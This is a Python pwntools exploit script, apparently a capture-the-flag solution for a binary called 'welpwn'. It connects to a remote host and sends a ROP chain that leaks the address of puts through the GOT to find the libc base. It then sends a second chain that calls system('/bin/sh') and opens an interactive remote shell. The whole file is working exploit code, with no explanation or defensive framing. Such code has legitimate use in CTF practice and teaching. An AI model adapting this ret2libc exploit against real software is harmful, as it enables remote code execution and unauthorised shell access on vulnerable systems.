
from pwn import *

# r = process('./welpwn')

r = remote('220.249.52.133', 48509)

# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('./libc6_2.23-0ubuntu10_amd64.so')
elf = ELF('./welpwn')

puts_off = libc.sym[b'puts']

puts_got = elf.got[b'puts']
puts_plt = elf.plt[b'puts']
main = elf.sym[b'main']

pop_rdi = 0x4008a3  # pop rdi; ret;
pop_r12 = 0x40089c  # pop r12; pop r13; pop r14; pop r15; ret;

r.readline()

p = b'A' * 24
p += p64(pop_r12)
p += p64(pop_rdi)
p += p64(puts_got)
p += p64(puts_plt)
p += p64(main)

r.sendline(p)

r.readline()
s = r.readline()

leak = u64(s[-9:-1]) >> 16

LIBC_BASE = leak - puts_off
ADDR_BINSH = next(libc.search('/bin/sh')) + LIBC_BASE
ADDR_SYSTEM = libc.symbols[b'system'] + LIBC_BASE

log.info('LIBC_BASE    : ' + hex(LIBC_BASE))
log.info('ADDR_SYSTEM  : ' + hex(ADDR_SYSTEM))
log.info('ADDR_BINSH   : ' + hex(ADDR_BINSH))


p = b'A' * 24
p += p64(pop_r12)
p += p64(pop_rdi)
p += p64(ADDR_BINSH)
p += p64(ADDR_SYSTEM)

r.sendline(p)

r.interactive()



